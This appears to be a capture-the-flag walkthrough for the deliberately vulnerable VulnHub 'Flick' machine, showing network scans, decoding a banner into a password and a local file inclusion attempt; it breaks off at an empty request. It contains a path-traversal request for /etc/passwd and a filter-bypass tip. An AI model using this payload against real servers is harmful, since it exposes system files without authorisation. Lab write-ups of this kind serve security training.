URL : https://www.vulnhub.com/entry/flick-1,99/

1.) Identify the IP address of the victim machine
root@kali:~# netdiscover 
 Currently scanning: 192.168.67.0/16   |   Screen View: Unique Hosts                                                                                                                                              

 12 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 720                                                                                                                                                 
 _____________________________________________________________________________ 
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
 192.168.174.2   00:50:56:ff:fc:d3    05    300   VMWare, Inc.                                                                                                                                                    
 192.168.174.138 00:0c:29:b0:86:24    04    240   VMware, Inc.                                                                                                                                                    
 192.168.174.254 00:50:56:e9:40:9d    02    120   VMWare, Inc.                                                                                                                                                    

root@kali:~# 

2.) Run an nmap syn scan to identify open ports and running services
root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.138

Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-23 11:17 EST
Nmap scan report for 192.168.174.138
Host is up (0.00064s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port8881-TCP:V=6.47%I=7%D=11/23%Time=56533C18%P=i686-pc-linux-gnu%r(NUL
SF:L,5F,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20pass
SF:word\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20
SF:door:\n>\x20")%r(GetRequest,78,"Welcome\x20to\x20the\x20admin\x20server
SF:\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch\x20a
SF:nd\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/\x20HTTP/1\.0\r\n\
SF:r\n\n>\x20")%r(FourOhFourRequest,9B,"Welcome\x20to\x20the\x20admin\x20s
SF:erver\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
SF:\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/nice%20ports%
SF:2C/Tri%6Eity\.txt%2ebak\x20HTTP/1\.0\r\n\r\n\n>\x20")%r(GenericLines,6A
SF:,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20password
SF:\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door
SF::\n>\x20OK:\x20\r\n\r\n\n>\x20")%r(HTTPOptions,7C,"Welcome\x20to\x20the
SF:\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'\x2
SF:0the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OPTIONS
SF:\x20/\x20HTTP/1\.0\r\n\r\n\n>\x20")%r(RTSPRequest,7C,"Welcome\x20to\x20
SF:the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'
SF:\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OPTI
SF:ONS\x20/\x20RTSP/1\.0\r\n\r\n\n>\x20")%r(RPCCheck,92,"Welcome\x20to\x20
SF:the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'
SF:\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\x80
SF:\0\0\(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n>\x20")%r(DNSVersionBindReq,86,"Welco
SF:me\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20password\x20wil
SF:l\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x2
SF:0OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10
SF:\0\x03\n>\x20")%r(DNSStatusRequest,74,"Welcome\x20to\x20the\x20admin\x2
SF:0server\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20swit
SF:ch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\0\x0c\0\0\x10\0\0\
SF:0\0\0\0\0\0\0\n>\x20")%r(Help,6C,"Welcome\x20to\x20the\x20admin\x20serv
SF:er\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch\x2
SF:0and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20HELP\r\n\n>\x20");
MAC Address: 00:0C:29:B0:86:24 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.174.138

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.16 seconds
root@kali:~# 

3.) Enumerating port 8881
root@kali:~# nc 192.168.174.138 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> admin
OK: admin

> password
OK: password

> ls
OK: ls

> 
root@kali:~#
root@kali:~# telnet 192.168.174.138 8881
Trying 192.168.174.138...
Connected to 192.168.174.138.
Escape character is '^]'.
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> admin
OK: admin

> 
root@kali:~#

4.) Enumerate SSH
root@kali:~# ssh 192.168.174.138
The authenticity of host '192.168.174.138 (192.168.174.138)' can't be established.
ECDSA key fingerprint is 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.174.138' (ECDSA) to the list of known hosts.

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

root@192.168.174.138's password: 

5.) Decoding 
http://www.asciitohex.com/
ASCII to HEX
Converting the above obtained HEX to ASCII gives
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
Decode the HEX to Base64 (16 times using Burp decoder)
tabupJievas8Knoj

6.) Try this on 8881
root@kali:~# telnet 192.168.174.138 8881
Trying 192.168.174.138...
Connected to 192.168.174.138.
Escape character is '^]'.
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> tabupJievas8Knoj
OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

> 

7.) Run nmap again
root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.138

Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-23 12:09 EST
Nmap scan report for 192.168.174.138
Host is up (0.00061s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Flick-a-Photo
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port8881-TCP:V=6.47%I=7%D=11/23%Time=56534843%P=i686-pc-linux-gnu%r(NUL
SF:L,5F,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20pass
SF:word\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20
SF:door:\n>\x20")%r(GetRequest,78,"Welcome\x20to\x20the\x20admin\x20server
SF:\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch\x20a
SF:nd\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/\x20HTTP/1\.0\r\n\
SF:r\n\n>\x20")%r(FourOhFourRequest,9B,"Welcome\x20to\x20the\x20admin\x20s
SF:erver\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
SF:\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/nice%20ports%
SF:2C/Tri%6Eity\.txt%2ebak\x20HTTP/1\.0\r\n\r\n\n>\x20")%r(GenericLines,6A
SF:,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20password
SF:\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door
SF::\n>\x20OK:\x20\r\n\r\n\n>\x20")%r(HTTPOptions,7C,"Welcome\x20to\x20the
SF:\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'\x2
SF:0the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OPTIONS
SF:\x20/\x20HTTP/1\.0\r\n\r\n\n>\x20")%r(RTSPRequest,7C,"Welcome\x20to\x20
SF:the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'
SF:\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OPTI
SF:ONS\x20/\x20RTSP/1\.0\r\n\r\n\n>\x20")%r(RPCCheck,92,"Welcome\x20to\x20
SF:the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'
SF:\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\x80
SF:\0\0\(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n>\x20")%r(DNSVersionBindReq,86,"Welco
SF:me\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20password\x20wil
SF:l\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x2
SF:0OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10
SF:\0\x03\n>\x20")%r(DNSStatusRequest,74,"Welcome\x20to\x20the\x20admin\x2
SF:0server\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20swit
SF:ch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\0\x0c\0\0\x10\0\0\
SF:0\0\0\0\0\0\0\n>\x20")%r(Help,6C,"Welcome\x20to\x20the\x20admin\x20serv
SF:er\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch\x2
SF:0and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20HELP\r\n\n>\x20");
MAC Address: 00:0C:29:B0:86:24 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.174.138

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.94 seconds
root@kali:~# 

8.) Enumerate port 80/tcp
Open in browser -> http://192.168.174.138
http://192.168.174.138/login/login
While we are testing the site, use the demo credentials that have been configured for the first user.
Username : Password -> demo:demo123

Local File Inclusion
In Burp
Request
GET /image/download?filename=../../etc/passwd HTTP/1.1
Host: 192.168.174.138
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.174.138/
Cookie: laravel_session=eyJpdiI6IkdFM0YzbFdMVXUyRnl1T0xxUHAzajNMWGk0Tk9GSjlPUmNcL3hTOTQ3Q1NJPSIsInZhbHVlIjoieGc0eWR6SzlBK0U2MDN0Q2xaa3JoZU11Z0FpQm0rVUc0S2xpWGVZS2VHck5uVTM1WDRYdnFvRXU2dmxaeHdHNVRSRlQzV25KblpPSlFnXC9YTmh2ZFBRPT0iLCJtYWMiOiI0YWM1N2JiZmI3ZmNlNmY2NjVlYjg1ZGZhZTgxNDNkZDA5MWIwNmE5MGI0MjhiN2E5Y2U1MmJjYWQzNWFjODJhIn0%3D
Connection: keep-alive
Response
<p>Oops! Looks like you requested a invalid file to download!</p>
<p><i>etc/passwd</i> is not valid.

It is stripping out one ../.
Fix -> Pad it with extra ../

Request
